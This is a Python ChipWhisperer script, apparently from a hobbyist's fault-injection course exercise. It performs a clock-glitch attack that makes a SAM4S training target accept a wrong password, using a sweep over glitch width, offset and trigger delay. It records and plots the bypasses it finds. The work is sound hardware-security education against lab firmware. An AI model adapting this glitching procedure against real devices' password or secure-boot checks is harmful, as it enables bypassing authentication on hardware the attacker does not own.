#!/usr/bin/env python3
# MIT License
#
# Copyright (c) 2026 David Reguera Garcia (aka Dreg)
# dreg@rootkit.es - https://github.com/therealdreg/abductor
#
# Disclaimer: this is the work of a hobbyist, shared in good faith for educational
# purposes. It is not professional work and may contain mistakes or inaccuracies;
# corrections and feedback are welcome. Provided "as is" and used at your own risk.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# Clock-glitch password bypass on the CW313 (the CW312T-SAM4S plugged directly into the CW313, no
# UFO or Abductor): search at repeat 1 for a reliable clean bypass at the crash onset, and stop
# after 8 bypasses. A bypass is the wrong password ([0]*5) accepted (passok=1).
# Needs simpleserial-glitch already on the target; the script does not flash. No arguments. Prints
# the first bypass and per-width counts, and saves clock_glitch_cw313.png in OUT. Exits with status
# 2 if the glitch-free password check fails.
import time
from collections import Counter
import matplotlib; matplotlib.use("Agg")
import matplotlib.pyplot as plt
import chipwhisperer as cw

OUT="/home/dreg/chipwhisperer/dregdoc/img"
scope=cw.scope(); target=cw.target(scope, cw.targets.SimpleSerial2)
scope.default_setup()
# Clock glitch: the Husky Plus XORs one glitch pulse (repeat 1) into the target clock on HS2.
scope.glitch.enabled=True; scope.glitch.clk_src="pll"; scope.glitch.output="clock_xor"
scope.glitch.trigger_src="ext_single"; scope.io.hs2="glitch"; scope.cglitch_setup()
scope.glitch.repeat=1; scope.adc.timeout=0.1
def reboot_flush():
    scope.io.nrst=False; time.sleep(0.05); scope.io.nrst="high_z"; time.sleep(0.05); target.flush()
WRONG=bytearray([0]*5)
def check(pw):
    reboot_flush(); target.simpleserial_write('p', pw)
    v=target.simpleserial_read_witherrors('r',1,glitch_timeout=10,timeout=1000)
    return v['payload'][0] if (v['valid'] and v['payload']) else None
# Glitch-free check: the wrong password must return 0 and "touch" (the bytes below) 1.
_w=check(WRONG); _c=check(bytearray([0x74,0x6F,0x75,0x63,0x68]))
print("sanity wrong ->",_w," correct ->",_c, flush=True)
if _w!=0 or _c!=1:
    print("SANITY FAILED", flush=True); scope.dis(); target.dis(); raise SystemExit(2)
# One glitched attempt from a fresh reset: "success" is a bypass, "normal" a rejected password,
# "reset" a crash (capture timeout or no valid reply), after which the target is reset again.
def attempt(w,o,e):
    if scope.adc.state: reboot_flush()
    reboot_flush()
    scope.glitch.width=w; scope.glitch.offset=o; scope.glitch.ext_offset=e
    scope.arm(); target.simpleserial_write('p', WRONG)
    if scope.capture(): reboot_flush(); return "reset"
    v=target.simpleserial_read_witherrors('r',1,glitch_timeout=10,timeout=50)
    if not v['valid'] or v['payload'] is None: reboot_flush(); return "reset"
    return "success" if v['payload'][0]==1 else "normal"

cw.set_all_log_levels(cw.logging.ERROR); reboot_flush()
recs=[]; succ=[]; total=0
# The grid brackets the region the isolation sweep (clock_glitch_cw313_isolation.py) pointed to:
# offsets near 2400 and 2800, ext_offset 88 to 156, and the crash onset at widths near 3400 to 3500.
# Each cell gets up to 2 attempts and moves on at its first bypass: at most 6 x 6 x 74 x 2 = 5328.
# Width and offset are Husky phase-shift steps; ext_offset is target clock cycles after the trigger.
WIDTHS=[3350,3400,3450,3500,3550,3600]; OFFS=[2300,2400,2500,2700,2800,2900]; EXTS=list(range(85,159,1))
done=False
for w in WIDTHS:
    c=Counter()
    for o in OFFS:
        for e in EXTS:
            for _t in range(2):
                cat=attempt(w,o,e); total+=1; c[cat]+=1; recs.append((w,o,e,cat))
                if cat=="success":
                    succ.append((w,o,e))
                    if len(succ)==1: print(f"bypass: width={w} offset={o} ext_offset={e} (attempt {total})", flush=True)
                    break
            if len(succ)>=8: done=True; break
        if done: break
    print(f"width={w}: reset={c['reset']} normal={c['normal']} success={c['success']} | total={total}", flush=True)
    if done: break
cw.set_all_log_levels(cw.logging.WARNING); scope.dis(); target.dis()
print("SUCCESSES:", len(succ), succ[:12], flush=True)
# Map of every attempt at the width of the first bypass (3500 if there is none): ext_offset on x,
# offset on y, one color per outcome.
if recs:
    wsel=succ[0][0] if succ else 3500
    m=[r for r in recs if r[0]==wsel]
    cmap={"success":"#2ca02c","reset":"#d62728","normal":"#cccccc"}
    plt.figure(figsize=(11,6))
    for cat in ["normal","reset","success"]:
        pts=[(e,o) for (w,o,e,cc) in m if cc==cat]
        if pts:
            xs,ys=zip(*pts); plt.scatter(xs,ys,s=20,c=cmap[cat],
                marker=("P" if cat=="success" else ("x" if cat=="reset" else ".")), label=f"{cat} ({len(pts)})", alpha=0.75)
    plt.xlabel("ext_offset (cycles)"); plt.ylabel("glitch offset (phase-shift steps)")
    ttl="CLOCK-GLITCH PASSWORD BYPASS" if succ else "clock glitch (crash-dominated, no clean bypass)"
    plt.title(f"fault101 Fault 1_2 on CW313 direct at width={wsel}: {ttl}\n(CW312T-SAM4S, no UFO/Abductor)")
    plt.legend(fontsize=9); plt.grid(alpha=0.3); plt.tight_layout()
    plt.savefig(f"{OUT}/clock_glitch_cw313.png", dpi=115); plt.close()
    print("saved:", OUT+"/clock_glitch_cw313.png", flush=True)
print("DONE")
